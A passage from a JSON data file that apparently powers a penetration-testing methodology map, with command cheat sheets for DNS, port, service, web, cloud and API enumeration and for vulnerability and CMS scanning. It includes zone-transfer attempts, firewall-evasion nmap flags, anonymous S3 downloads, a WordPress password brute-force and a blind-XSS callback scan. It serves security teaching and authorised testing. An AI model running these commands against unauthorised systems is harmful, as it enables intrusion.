                                "label": "DNS Enumeration",
                                "description": "Records & misconfig",
                                "descriptionMd": "### DNS Enumeration\nGo beyond simple lookups. Attempt **Zone Transfers (AXFR)** to get the full domain map. Check for **SRV records** (Active Directory/VoIP), **TXT records** (SPF, DKIM, verification tokens), and brute-force subdomains to find hosts not indexed publicly.\n\n**DNS Record Types:**\n* **A/AAAA:** IPv4/IPv6 addresses\n* **MX:** Mail servers (potential targets)\n* **NS:** Name servers (zone transfer targets)\n* **TXT:** Verification records, SPF policies, metadata\n* **SRV:** Service discovery (LDAP, Kerberos, SIP)\n* **CNAME:** Aliases (potential subdomain takeover)\n* **SOA:** Zone authority information\n* **CAA:** Certificate authority restrictions\n\n**Common Misconfigurations:**\n* Zone transfers enabled on authoritative nameservers\n* Wildcard DNS records hiding infrastructure\n* Missing DNSSEC\n* Exposed internal IP addresses in DNS\n* Subdomain takeover via dangling CNAMEs",
                                "commands": [{
                                        "description": "Dig Basic Records",
                                        "code": "dig A target.com +short; dig MX target.com +short; dig TXT target.com +short"
                                    },
                                    {
                                        "description": "Dig All Record Types",
                                        "code": "dig target.com ANY +noall +answer"
                                    },
                                    {
                                        "description": "Zone Transfer Check",
                                        "code": "dig axfr @ns1.target.com target.com"
                                    },
                                    {
                                        "description": "Find Name Servers",
                                        "code": "dig NS target.com +short"
                                    },
                                    {
                                        "description": "DNSRecon (Comprehensive)",
                                        "code": "dnsrecon -d target.com -t std,axfr,bing,zonewalk -D subdomains.txt"
                                    },
                                    {
                                        "description": "DNSRecon (Zone Walking)",
                                        "code": "dnsrecon -d target.com -t zonewalk"
                                    },
                                    {
                                        "description": "Fierce (DNS Scanner)",
                                        "code": "fierce --domain target.com --subdomains accounts admin api dev staging"
                                    },
                                    {
                                        "description": "DNSenum",
                                        "code": "dnsenum --enum target.com -f dns-wordlist.txt --threads 10"
                                    },
                                    {
                                        "description": "NSLookup Zone Transfer",
                                        "code": "nslookup -type=NS target.com && nslookup -type=AXFR target.com ns1.target.com"
                                    },
                                    {
                                        "description": "Host Command AXFR",
                                        "code": "host -t AXFR target.com ns1.target.com"
                                    },
                                    {
                                        "description": "Check SRV Records",
                                        "code": "dig SRV _ldap._tcp.target.com +short"
                                    },
                                    {
                                        "description": "Reverse DNS Lookup",
                                        "code": "dig -x 192.168.1.1 +short"
                                    },
                                    {
                                        "description": "Find shared DNS servers",
                                        "code": "Use dnsdumpster.com web interface"
                                    }
                                ],
                                "type": "technique",
                                "emoji": "🧷",
                                "resources": [{
                                    "title": "DNS Enumeration Guide",
                                    "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns"
                                }]
                            },
                            "children": []
                        },
                        {
                            "id": "port-scan",
                            "data": {
                                "label": "Port Scanning",
                                "description": "Service Discovery",
                                "descriptionMd": "### Port Scanning\nThe goal is to identify open ports and the services running on them. Differentiate between TCP (reliable) and UDP (connectionless). Be mindful of scan rates to avoid IP bans.\n\n**Scan Types:**\n* **TCP SYN Scan (-sS):** Stealthy, doesn't complete handshake\n* **TCP Connect Scan (-sT):** Full connection, more detectable\n* **UDP Scan (-sU):** Slower, important for DNS, SNMP\n* **Version Detection (-sV):** Identify service versions\n* **OS Detection (-O):** Fingerprint operating system\n\n**Timing Templates:**\n* **-T0 (Paranoid):** Very slow, IDS evasion\n* **-T1 (Sneaky):** Slow, less detectable\n* **-T2 (Polite):** Slows down to use less bandwidth\n* **-T3 (Normal):** Default timing\n* **-T4 (Aggressive):** Fast, assumes good network\n* **-T5 (Insane):** Very fast, may miss ports\n\n**Important Ports:**\n* 21 (FTP), 22 (SSH), 23 (Telnet)\n* 25 (SMTP), 53 (DNS), 80/443 (HTTP/HTTPS)\n* 110 (POP3), 143 (IMAP), 445 (SMB)\n* 1433 (MSSQL), 3306 (MySQL), 3389 (RDP)\n* 5432 (PostgreSQL), 5900 (VNC), 8080 (Alt HTTP)",
                                "commands": [{
                                        "description": "Nmap Fast Scan",
                                        "code": "nmap -T4 -F target.com"
                                    },
                                    {
                                        "description": "Nmap Full TCP",
                                        "code": "nmap -p- -sV -sC -T4 -oA nmap_full target.com"
                                    },
                                    {
                                        "description": "Nmap (Stealth SYN)",
                                        "code": "nmap -sS -p- --min-rate=1000 -T4 target.com"
                                    },
                                    {
                                        "description": "Nmap (Version + OS Detection)",
                                        "code": "nmap -sV -O -sC -p- -A target.com -oA nmap_detailed"
                                    },
                                    {
                                        "description": "Nmap (Evade Firewall)",
                                        "code": "nmap -sS -f -D RND:10 --randomize-hosts target.com"
                                    },
                                    {
                                        "description": "Nmap UDP Top 100",
                                        "code": "nmap -sU --top-ports 100 target.com"
                                    },
                                    {
                                        "description": "Nmap (Specific Ports)",
                                        "code": "nmap -p 80,443,8080,8443 -sV -sC target.com"
                                    },
                                    {
                                        "description": "Masscan (Large Networks)",
                                        "code": "masscan -p1-65535 192.168.1.0/24 --rate=1000"
                                    },
                                    {
                                        "description": "Masscan (Full Range Fast)",
                                        "code": "masscan -p1-65535 target.com --rate=10000 -oL masscan_output.txt"
                                    },
                                    {
                                        "description": "Naabu (Fast Port Discovery)",
                                        "code": "naabu -host target.com -top-ports 1000 -silent | tee ports.txt"
                                    },
                                    {
                                        "description": "RustScan (Fast Pre-scan)",
                                        "code": "rustscan -a target.com --ulimit 5000 -- -sV -sC"
                                    },
                                    {
                                        "description": "Naabu (Full Range)",
                                        "code": "naabu -host target.com"
                                    }
                                ],
                                "type": "tool",
                                "emoji": "🎯",
                                "resources": [{
                                        "title": "Nmap Cheat Sheet",
                                        "url": "https://highon.coffee/blog/nmap-cheat-sheet/"
                                    },
                                    {
                                        "title": "Nmap Official Guide",
                                        "url": "https://nmap.org/book/man.html"
                                    }
                                ]
                            },
                            "children": []
                        },
                        {
                            "id": "http-probing",
                            "data": {
                                "label": "HTTP Probing",
                                "description": "Status, titles, redirects",
                                "descriptionMd": "### HTTP Probing\nAfter finding subdomains, you need to filter which ones are actually running web servers. Tools like `httpx` normalize URLs, capture **status codes** (200, 403, 500), **page titles**, **technologies**, and **response headers**.\n\n**What to Capture:**\n* **Status Codes:** 200 (OK), 301/302 (Redirects), 401 (Auth Required), 403 (Forbidden), 500 (Server Error)\n* **Page Titles:** Identify services (\"Jenkins Dashboard\", \"GitLab Login\")\n* **Technologies:** Server headers, X-Powered-By, cookies\n* **Content Length:** Identify unique vs duplicate pages\n* **Response Time:** Slow responses may indicate heavy processing\n* **TLS/SSL Info:** Certificate details, cipher suites\n\n**Filtering Strategy:**\n1. Probe all subdomains for HTTP/HTTPS\n2. Filter by status code (exclude 404s)\n3. Group by page title to find similar services\n4. Screenshot interesting pages for visual inspection\n5. Identify technology stack for targeted attacks",
                                "commands": [{
                                        "description": "Httpx (Rich Output)",
                                        "code": "httpx -l all_subs.txt -title -tech-detect -status-code -follow-redirects -o web_hosts.txt"
                                    },
                                    {
                                        "description": "Httpx (Full Information)",
                                        "code": "httpx -l subs.txt -title -status-code -content-length -tech-detect -server -method -ip -cname -cdn"
                                    },
                                    {
                                        "description": "Httpx (Screenshot)",
                                        "code": "httpx -l subs.txt -screenshot -system-chrome"
                                    },
                                    {
                                        "description": "Httprobe",
                                        "code": "cat all_subs.txt | httprobe -c 50 > alive_urls.txt"
                                    },
                                    {
                                        "description": "Httprobe (Specific Ports)",
                                        "code": "cat subs.txt | httprobe -p http:8080 -p https:8443 -p http:8000"
                                    },
                                    {
                                        "description": "Screenshotting (GoWitness)",
                                        "code": "gowitness file -f alive_urls.txt"
                                    },
                                    {
                                        "description": "Screenshotting (Aquatone)",
                                        "code": "cat alive_urls.txt | aquatone -out aquatone_report/"
                                    },
                                    {
                                        "description": "EyeWitness",
                                        "code": "python3 EyeWitness.py -f alive_urls.txt --web"
                                    },
                                    {
                                        "description": "Check Specific Path",
                                        "code": "httpx -l subs.txt -path /admin -mc 200,301,302,401,403"
                                    }
                                ],
                                "type": "tool",
                                "emoji": "🛰️",
                                "resources": [{
                                    "title": "Httpx Documentation",
                                    "url": "https://github.com/projectdiscovery/httpx"
                                }]
                            },
                            "children": []
                        },
                        {
                            "id": "service-enum",
                            "data": {
                                "label": "Service Enumeration",
                                "description": "Bannering & protocol checks",
                                "descriptionMd": "### Service Enumeration\nOnce ports are found, identify exactly what software and version is running. Check for **default credentials**, **outdated versions** (CVEs), and weak configurations (e.g., weak SSL/TLS ciphers).\n\n**Common Services to Enumerate:**\n* **FTP (21):** Anonymous login, version disclosure\n* **SSH (22):** Version, supported algorithms, user enumeration\n* **SMTP (25):** VRFY/EXPN commands for user enum\n* **SMB (445):** Shares, users, groups, null sessions\n* **SNMP (161):** Community strings (public/private), MIB info\n* **LDAP (389):** Anonymous bind, domain info\n* **MSSQL (1433):** sa account, xp_cmdshell\n* **MySQL (3306):** Root access, file read/write\n* **RDP (3389):** BlueKeep, user enumeration\n\n**Enumeration Goals:**\n* Software name and exact version\n* Default credentials testing\n* Anonymous/guest access\n* User enumeration\n* Share/directory permissions\n* Supported protocols and ciphers",
                                "commands": [{
                                        "description": "Nmap Version/Script",
                                        "code": "nmap -sV -sC -p 21,22,80,443,445,3306,3389 target"
                                    },
                                    {
                                        "description": "Nmap (All Service Scripts)",
                                        "code": "nmap -sV --script=\"*-enum,*-info\" -p- target.com"
                                    },
                                    {
                                        "description": "SMB Enumeration (enum4linux)",
                                        "code": "enum4linux -a target_ip"
                                    },
                                    {
                                        "description": "SMB Enumeration (Detailed)",
                                        "code": "enum4linux -a -u \"\" -p \"\" target_ip"
                                    },
                                    {
                                        "description": "SMBMap",
                                        "code": "smbmap -H target_ip -u guest -p \"\""
                                    },
                                    {
                                        "description": "SMBMap (Recursive)",
                                        "code": "smbmap -H target_ip -u username -p password -R"
                                    },
                                    {
                                        "description": "SMBClient",
                                        "code": "smbclient -L //target_ip -N"
                                    },
                                    {
                                        "description": "TLS/SSL Cipher Check",
                                        "code": "nmap --script ssl-enum-ciphers -p 443 target"
                                    },
                                    {
                                        "description": "Banner Grabbing (Netcat)",
                                        "code": "nc -nv target_ip 80"
                                    },
                                    {
                                        "description": "RPC Enumeration",
                                        "code": "rpcclient -U \"\" -N target_ip"
                                    },
                                    {
                                        "description": "SNMP Walk",
                                        "code": "snmpwalk -v2c -c public target_ip"
                                    },
                                    {
                                        "description": "SNMP Enumeration",
                                        "code": "snmp-check target_ip -c public"
                                    },
                                    {
                                        "description": "NFS Enumeration",
                                        "code": "showmount -e target_ip"
                                    },
                                    {
                                        "description": "LDAP Anonymous Bind",
                                        "code": "ldapsearch -x -H ldap://target_ip -b \"dc=domain,dc=com\""
                                    },
                                    {
                                        "description": "FTP Anonymous Login",
                                        "code": "ftp target_ip (try username: anonymous, password: anonymous)"
                                    }
                                ],
                                "type": "technique",
                                "emoji": "🧭",
                                "resources": [{
                                    "title": "HackTricks Service Enumeration",
                                    "url": "https://book.hacktricks.xyz/network-services-pentesting/"
                                }]
                            },
                            "children": []
                        },
                        {
                            "id": "web-enum",
                            "data": {
                                "label": "Web Enumeration",
                                "description": "Directories & Tech",
                                "descriptionMd": "### Web Enumeration\nDeep dive into web applications. Fingerprint the technology stack (WAF, CMS, Framework). Brute-force directories to find hidden admin panels, backups (`.bak`), or config files.\n\n**Technology Fingerprinting:**\n* **Web Server:** Apache, Nginx, IIS, LiteSpeed\n* **Programming Language:** PHP, Python, Ruby, Node.js, Java\n* **Framework:** Django, Flask, Rails, Express, Spring\n* **CMS:** WordPress, Joomla, Drupal, Magento\n* **CDN:** Cloudflare, Akamai, Fastly\n* **WAF:** ModSecurity, Cloudflare WAF, AWS WAF\n\n**Directory Brute-forcing:**\n* Common paths: /admin, /api, /backup, /config, /test\n* Backup files: .bak, .old, .backup, .swp, ~\n* Config files: .env, config.php, web.config\n* Source control: .git, .svn, .hg\n* Documentation: /docs, /swagger, /api-docs\n\n**Wordlist Strategy:**\n* Start with small, common wordlists\n* Use technology-specific wordlists\n* Generate custom wordlists based on findings\n* Combine multiple sources",
                                "commands": [{
                                        "description": "Gobuster (Dir Enum)",
                                        "code": "gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt -t 50"
                                    },
                                    {
                                        "description": "Gobuster (Extensions)",
                                        "code": "gobuster dir -u https://target.com -w wordlist.txt -x php,txt,html,bak -t 30"
                                    },
                                    {
                                        "description": "Feroxbuster (Recursive)",
                                        "code": "feroxbuster -u https://target.com -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt"
                                    },
                                    {
                                        "description": "Feroxbuster (With Depth)",
                                        "code": "feroxbuster -u https://target.com -w wordlist.txt -d 3 -t 50 --auto-tune"
                                    },
                                    {
                                        "description": "Ffuf (Fast Fuzzing)",
                                        "code": "ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,302,401,403 -fc 404"
                                    },
                                    {
                                        "description": "Ffuf (Extensions)",
                                        "code": "ffuf -u https://target.com/FUZZ -w wordlist.txt -e .php,.html,.txt,.bak"
                                    },
                                    {
                                        "description": "Dirsearch",
                                        "code": "dirsearch -u https://target.com -e php,asp,aspx,jsp,html,zip,jar -x 404,403"
                                    },
                                    {
                                        "description": "WhatWeb (Tech Stack)",
                                        "code": "whatweb -a 3 https://target.com"
                                    },
                                    {
                                        "description": "Wappalyzer (Tech Stack)",
                                        "code": "wappy -u https://target.com"
                                    },
                                    {
                                        "description": "WafW00f (WAF Detect)",
                                        "code": "wafw00f https://target.com"
                                    },
                                    {
                                        "description": "Builtwith Lookup",
                                        "code": "curl \"https://api.builtwith.com/v20/api.json?KEY=YOUR_KEY&LOOKUP=target.com\""
                                    },
                                    {
                                        "description": "Retire.js (JS Vulnerabilities)",
                                        "code": "retire --jspath https://target.com/js/ --outputformat json"
                                    },
                                    {
                                        "description": "Nuclei (Tech Detection)",
                                        "code": "nuclei -u https://target.com -t technologies/ -silent"
                                    },
                                    {
                                        "description": "Check Robots.txt",
                                        "code": "curl https://target.com/robots.txt"
                                    },
                                    {
                                        "description": "Check Sitemap",
                                        "code": "curl https://target.com/sitemap.xml"
                                    }
                                ],
                                "type": "tool",
                                "emoji": "🌐",
                                "resources": [{
                                        "title": "SecLists Wordlists",
                                        "url": "https://github.com/danielmiessler/SecLists"
                                    },
                                    {
                                        "title": "Assetnote Wordlists",
                                        "url": "https://github.com/assetnote/wordlists"
                                    }
                                ]
                            },
                            "children": []
                        },
                        {
                            "id": "cloud-enum",
                            "data": {
                                "label": "Cloud Enumeration",
                                "description": "Buckets & Azure Blobs",
                                "descriptionMd": "### Cloud Enumeration\nModern apps rely on cloud storage. Check for misconfigured (public) **AWS S3 buckets**, **Azure Blobs**, or **GCP Storage**. These often host PII, backups, or source code.\n\n**Cloud Storage Types:**\n* **AWS S3:** s3.amazonaws.com, bucket-name.s3.amazonaws.com\n* **Azure Blob:** blob.core.windows.net, account.blob.core.windows.net\n* **GCP Storage:** storage.googleapis.com, storage.cloud.google.com\n* **DigitalOcean Spaces:** digitaloceanspaces.com\n\n**Common Naming Patterns:**\n* Company name: target, target-corp, targetcompany\n* Environment: prod, dev, staging, test, backup\n* Function: uploads, images, documents, backups, logs\n* Geographic: us-east-1, eu-west-1, asia\n\n**What to Look For:**\n* **List Permissions:** Can you list bucket contents?\n* **Read Permissions:** Can you download files?\n* **Write Permissions:** Can you upload files?\n* **Sensitive Data:** Credentials, source code, customer data, backups\n* **Subdomain Takeover:** Buckets referenced in DNS but deleted",
                                "commands": [{
                                        "description": "Cloud_enum",
                                        "code": "python3 cloud_enum.py -k target -k target-corp"
                                    },
                                    {
                                        "description": "Cloud_enum (Specific Providers)",
                                        "code": "python3 cloud_enum.py -k target --quickscan --disable-azure --disable-gcp"
                                    },
                                    {
                                        "description": "AWS CLI S3 List",
                                        "code": "aws s3 ls s3://target-bucket --no-sign-request"
                                    },
                                    {
                                        "description": "AWS CLI S3 List Recursive",
                                        "code": "aws s3 ls s3://target-bucket --no-sign-request --recursive"
                                    },
                                    {
                                        "description": "AWS CLI S3 Download",
                                        "code": "aws s3 cp s3://target-bucket/file.txt . --no-sign-request"
                                    },
                                    {
                                        "description": "AWS CLI S3 Sync",
                                        "code": "aws s3 sync s3://target-bucket ./local_dir --no-sign-request"
                                    },
                                    {
                                        "description": "S3Scanner",
                                        "code": "python3 s3scanner.py --include-closed --out-file found.txt --dump buckets.txt"
                                    },
                                    {
                                        "description": "Bucket Stream",
                                        "code": "python3 bucket-stream.py --keyword target"
                                    },
                                    {
                                        "description": "S3 Bucket Finder",
                                        "code": "ruby s3-buckets-bruteforcer.rb --wordlist buckets.txt"
                                    },
                                    {
                                        "description": "Azure Blob Check",
                                        "code": "curl https://targetaccount.blob.core.windows.net/?comp=list"
                                    },
                                    {
                                        "description": "GCP Bucket Check",
                                        "code": "curl https://storage.googleapis.com/target-bucket/"
                                    },
                                    {
                                        "description": "Lazy S3",
                                        "code": "ruby lazys3.rb target.com"
                                    }
                                ],
                                "type": "technique",
                                "emoji": "☁️",
                                "resources": [{
                                        "title": "Cloud Storage Security",
                                        "url": "https://github.com/initstring/cloud_enum"
                                    },
                                    {
                                        "title": "S3 Bucket Permissions",
                                        "url": "https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-overview.html"
                                    }
                                ]
                            },
                            "children": []
                        }
                    ]
                }]
            },

            {
                "id": "vuln-analysis",
                "data": {
                    "label": "Vulnerability Analysis",
                    "description": "Prioritize What to Test",
                    "descriptionMd": "### Vulnerability Analysis\nThis phase bridges the gap between Reconnaissance and Exploitation. You take the raw data (IPs, domains, technologies) and identify potential weaknesses.\n\n**Key Goals:**\n* **Correlate:** Match version numbers to known CVEs.\n* **Map:** Visualize the application logic and entry points.\n* **Scan:** Use automated tools to find low-hanging fruit.\n* **Triage:** Manually verify scanner results to eliminate false positives.\n* **Prioritize:** Focus on high-impact, exploitable vulnerabilities based on CVSS scores and business context.\n\n**Best Practices:**\n* Always get written permission before scanning.\n* Use rate limiting to avoid DoS or detection.\n* Document all findings with proof-of-concept evidence.\n* Manually verify automated scanner results.",
                    "commands": [],
                    "type": "category",
                    "emoji": "🧪",
                    "resources": [{
                            "title": "OWASP ASVS",
                            "url": "https://owasp.org/www-project-application-security-verification-standard/"
                        },
                        {
                            "title": "CVSS Calculator",
                            "url": "https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator"
                        },
                        {
                            "title": "CWE Top 25",
                            "url": "https://cwe.mitre.org/top25/"
                        },
                        {
                            "title": "OWASP Testing Guide",
                            "url": "https://owasp.org/www-project-web-security-testing-guide/"
                        }
                    ]
                },
                "children": [{
                        "id": "attack-surface-map",
                        "data": {
                            "label": "Attack Surface Mapping",
                            "description": "Inputs, trust boundaries",
                            "descriptionMd": "### Attack Surface Mapping\nBefore attacking, you must understand the application's logic. Identify all **entry points** (GET/POST parameters, headers, cookies) and **trust boundaries** (where data enters the system).\n\n**Key Components to Map:**\n* **Hidden Parameters:** Devs often leave debug params active (e.g., `?debug=true`, `?admin=1`).\n* **API Routes:** Undocumented endpoints that bypass frontend validation.\n* **File Upload Points:** Prime targets for RCE via web shells.\n* **Authentication Flows:** Password reset, OAuth callbacks, SSO integration points.\n* **WebSocket Endpoints:** Real-time communication channels often overlooked.\n* **HTTP Headers:** Custom headers like X-Original-URL, X-Forwarded-For.\n* **Cookie Parameters:** Session tokens, preference settings.\n\n**Trust Boundaries:**\n* User input → Server processing\n* Frontend validation → Backend verification\n* API gateway → Internal services\n* External integrations → Application logic",
                            "commands": [{
                                    "description": "Arjun (Find Hidden Params)",
                                    "code": "arjun -u https://target.com/endpoint -w params.txt -t 10"
                                },
                                {
                                    "description": "ParamSpider (Extract URLs with params)",
                                    "code": "paramspider -d target.com -s true"
                                },
                                {
                                    "description": "Burp Suite Site Map",
                                    "code": "Proxy traffic -> 'Target' Tab -> 'Site Map' -> Filter by Parameterized Requests"
                                },
                                {
                                    "description": "x8 (Advanced Param Discovery)",
                                    "code": "x8 -u \"https://target.com/endpoint\" -w params.txt -X POST --append"
                                },
                                {
                                    "description": "Extract Endpoints from JS",
                                    "code": "cat js_files.txt | grep -Eo \"(http|https)://[a-zA-Z0-9./?=_-]*\" | sort -u"
                                },
                                {
                                    "description": "LinkFinder (JS Endpoint Extract)",
                                    "code": "python3 linkfinder.py -i https://target.com/app.js -o results.html"
                                },
                                {
                                    "description": "GAP (Google Analytics Params)",
                                    "code": "python3 gap.py -u https://target.com"
                                }
                            ],
                            "type": "technique",
                            "emoji": "🗺️",
                            "resources": [{
                                    "title": "OWASP Attack Surface Analysis",
                                    "url": "https://cheatsheetseries.owasp.org/cheatsheets/Attack_Surface_Analysis_Cheat_Sheet.html"
                                },
                                {
                                    "title": "Parameter Discovery Wordlists",
                                    "url": "https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content"
                                }
                            ]
                        },
                        "children": []
                    },
                    {
                        "id": "web-vuln-scan",
                        "data": {
                            "label": "Web Scanning",
                            "description": "Targeted templates & checks",
                            "descriptionMd": "### Web Vulnerability Scanning\nUse automated scanners to catch common flaws (XSS, SQLi, Open Redirects, SSRF). **Caution:** Heavy scanning can take down fragile servers or get you IP banned.\n\n**Scanner Types:**\n* **Template-based scanning** (Nuclei) is preferred for low-noise, specific checks with minimal false positives.\n* **Dynamic Application Security Testing (DAST)** tools (ZAP, Burp) crawl and fuzz entire applications.\n* **Signature-based** (Jaeles) uses custom detection signatures.\n\n**Scanning Strategy:**\n1. Start with passive/baseline scans\n2. Use rate limiting (`-rate-limit`, `-c` flags)\n3. Target specific technologies with focused templates\n4. Manually verify all critical findings\n5. Document false positives to avoid duplicate work\n\n**Common Issues:**\n* False positives in authentication-required pages\n* Scanner timeouts on slow applications\n* WAF/IPS triggering and blocking your IP",
                            "commands": [{
                                    "description": "Nuclei (Critical/High Severity)",
                                    "code": "nuclei -l alive.txt -severity high,critical -t cves/ -o vuln_report.txt"
                                },
                                {
                                    "description": "Nuclei (Technology Specific)",
                                    "code": "nuclei -u https://target.com -tags jira,panel,tomcat,jenkins"
                                },
                                {
                                    "description": "Nuclei (Rate Limited)",
                                    "code": "nuclei -l targets.txt -rate-limit 10 -c 5 -severity medium,high,critical"
                                },
                                {
                                    "description": "Nuclei (Custom Templates)",
                                    "code": "nuclei -u https://target.com -t ~/custom-templates/ -v"
                                },
                                {
                                    "description": "OWASP ZAP (Baseline Scan)",
                                    "code": "docker run -t owasp/zap2docker-stable zap-baseline.py -t https://target.com -r report.html"
                                },
                                {
                                    "description": "OWASP ZAP (Full Scan)",
                                    "code": "docker run -t owasp/zap2docker-stable zap-full-scan.py -t https://target.com"
                                },
                                {
                                    "description": "Nikto (Server Misconfig)",
                                    "code": "nikto -h https://target.com -Tuning 123bde -o nikto_report.txt"
                                },
                                {
                                    "description": "Jaeles (Signature Scan)",
                                    "code": "jaeles scan -s signatures/ -u https://target.com -o results/"
                                },
                                {
                                    "description": "Dalfox (XSS Scanner)",
                                    "code": "dalfox url https://target.com/search?q=FUZZ -b hahwul.xss.ht"
                                }
                            ],
                            "type": "tool",
                            "emoji": "🧰",
                            "resources": [{
                                    "title": "Nuclei Templates",
                                    "url": "https://github.com/projectdiscovery/nuclei-templates"
                                },
                                {
                                    "title": "ZAP Scanning Policies",
                                    "url": "https://www.zaproxy.org/docs/desktop/start/policies/"
                                },
                                {
                                    "title": "Jaeles Signatures",
                                    "url": "https://github.com/jaeles-project/jaeles-signatures"
                                }
                            ]
                        },
                        "children": []
                    },
                    {
                        "id": "cms-scan",
                        "data": {
                            "label": "CMS Scanning",
                            "description": "WordPress, Joomla, Drupal",
                            "descriptionMd": "### CMS Specific Scanning\nGeneric scanners often miss vulnerabilities specific to Content Management Systems. If you detect WordPress, Joomla, or Drupal during reconnaissance, use specialized tools to enumerate **plugins**, **themes**, and **users**.\n\n**CMS Vulnerability Categories:**\n* **Outdated Core:** Old CMS versions with known CVEs (e.g., WordPress < 5.0 RCE).\n* **Vulnerable Plugins/Extensions:** Most CMS breaches originate from 3rd-party components.\n* **Theme Vulnerabilities:** Custom themes with insecure code, hardcoded credentials.\n* **User Enumeration:** Weak authentication allows username harvesting for brute-force.\n* **Config File Exposure:** Backup files like `wp-config.php.bak`, `.git` folders.\n* **Xmlrpc.php Abuse:** WordPress XML-RPC endpoint for brute-forcing and DDoS amplification.\n* **Admin Panel Discovery:** `/wp-admin`, `/administrator`, default login pages.\n\n**Enumeration Targets:**\n* Plugin versions and known CVEs\n* Theme vulnerabilities\n* Username lists for credential attacks\n* Uploaded file directories\n* Database backup files",
                            "commands": [{
                                    "description": "WPScan (Full Enumeration)",
                                    "code": "wpscan --url https://target.com --enumerate p,t,u --api-token YOUR_TOKEN"
                                },
                                {
                                    "description": "WPScan (Aggressive Plugin Detection)",
                                    "code": "wpscan --url https://target.com --enumerate ap --plugins-detection aggressive"
                                },
                                {
                                    "description": "WPScan (Password Attack)",
                                    "code": "wpscan --url https://target.com -U users.txt -P passwords.txt"
                                },
                                {
                                    "description": "WPScan (Vulnerable Plugins Only)",
                                    "code": "wpscan --url https://target.com --enumerate vp --api-token YOUR_TOKEN"
                                },
                                {
                                    "description": "JoomScan (Joomla)",
                                    "code": "perl joomscan.pl -u https://target.com -ec"
                                },
                                {
                                    "description": "Droopescan (Drupal)",
                                    "code": "droopescan scan drupal -u https://target.com -t 10"
                                },
                                {
                                    "description": "CMSmap (Multi-CMS Scanner)",
                                    "code": "cmsmap -t https://target.com -a"
                                },
                                {
                                    "description": "WPSeku (WordPress Security)",
                                    "code": "python wpseku.py -t https://target.com"
                                }
                            ],
                            "type": "tool",
                            "emoji": "🧩",
                            "resources": [{
                                    "title": "WPVulnDB",
                                    "url": "https://wpscan.com/wordpresses"
                                },
                                {
                                    "title": "WordPress Security Scanner",
                                    "url": "https://patchstack.com/"
                                },
                                {
                                    "title": "Joomla Vulnerable Extensions",
                                    "url": "https://vel.joomla.org/"
                                },
                                {
                                    "title": "Drupal Security Advisories",
                                    "url": "https://www.drupal.org/security"
                                }
                            ]
                        },
                        "children": []
                    },
                    {
                        "id": "api-discovery",
                        "data": {
                            "label": "API Discovery",
                            "description": "Endpoints & Spec files",
                            "descriptionMd": "### API Discovery\nModern applications are often just frontends for APIs. Look for `swagger.json`, `graphql` endpoints, or undocumented routes. APIs frequently lack proper authentication and expose sensitive data.\n\n**Discovery Targets:**\n* **OpenAPI/Swagger Specs:** `/swagger.json`, `/api-docs`, `/v1/swagger-ui.html`, `/api/swagger.yaml`\n* **GraphQL Endpoints:** `/graphql`, `/v1/graphql`, `/api/graphql`, `/query`\n* **REST APIs:** Brute-force common paths (`/api/v1/users`, `/api/admin`, `/rest/`)\n* **WSDL Files:** Legacy SOAP services (`/service.wsdl`, `?wsdl`)\n* **API Versioning:** Test multiple versions (`/v1/`, `/v2/`, `/v3/`)\n* **Undocumented Endpoints:** Internal APIs not listed in public docs\n\n**Common API Vulnerabilities:**\n* **Broken Authentication:** Missing or weak API keys, JWT flaws\n* **Excessive Data Exposure:** APIs returning more data than needed\n* **Mass Assignment:** Modifying unintended object properties\n* **BOLA/IDOR:** Accessing other users' data by changing IDs\n* **Rate Limiting Issues:** No throttling on sensitive endpoints\n* **GraphQL Introspection:** Exposing entire schema when it should be disabled",
                            "commands": [{
                                    "description": "Kiterunner (API Route Discovery)",
                                    "code": "kr scan https://target.com -w routes-large.kite -x 10"
                                },
                                {
                                    "description": "Kiterunner (Brute + Wordlist)",
                                    "code": "kr brute https://target.com -w routes.kite -A=apiroutes-210328"
                                },
                                {
                                    "description": "Find Swagger/OpenAPI Specs",
                                    "code": "ffuf -u https://target.com/FUZZ -w swagger-wordlist.txt -mc 200"
                                }, {
                                    "description": "GraphQL Introspection Query",
                                    "code": "curl -X POST https://target.com/graphql -H 'Content-Type: application/json' -d '{\\\"query\\\":\\\"{__schema{types{name fields{name}}}}\\\"}'"
                                }, {
                                    "description": "Arjun (API Parameter Discovery)",
                                    "code": "arjun -u https://target.com/api/endpoint -m JSON"
                                },
                                {
                                    "description": "ffuf (API Endpoint Fuzzing)",
                                    "code": "ffuf -u https://target.com/api/FUZZ -w api-endpoints.txt -mc 200,201,301,302,401,403 -fc 404"
                                },
                                {
                                    "description": "REST API Versioning Test",
                                    "code": "for i in {1..5}; do curl -I https://target.com/v$i/api/users; done"
                                },
                                {
                                    "description": "WSDL Discovery",
                                    "code": "curl https://target.com/service?wsdl"
                                },
                                {
                                    "description": "GraphQL Voyager (Schema Viz)",
                                    "code": "Use introspection JSON at: https://ivangoncharov.github.io/graphql-voyager/"
                                }
                            ],
                            "type": "technique",
                            "emoji": "🔌",
                            "resources": [{
                                    "title": "OWASP API Security Top 10",
                                    "url": "https://owasp.org/API-Security/"
                                },
                                {
                                    "title": "API Security Checklist",
                                    "url": "https://github.com/shieldfy/API-Security-Checklist"
                                },
                                {
                                    "title": "Kiterunner Wordlists",
                                    "url": "https://github.com/assetnote/wordlists"
                                },
                                {
                                    "title": "GraphQL Security Best Practices",
                                    "url": "https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html"
                                },
                                {
                                    "title": "REST API Security Cheat Sheet",
                                    "url": "https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html"
                                }
                            ]
                        },
                        "children": []
                    },
                    {
                        "id": "misconfig",
                        "data": {
                            "label": "Misconfigurations",
                            "description": "Hardening gaps",
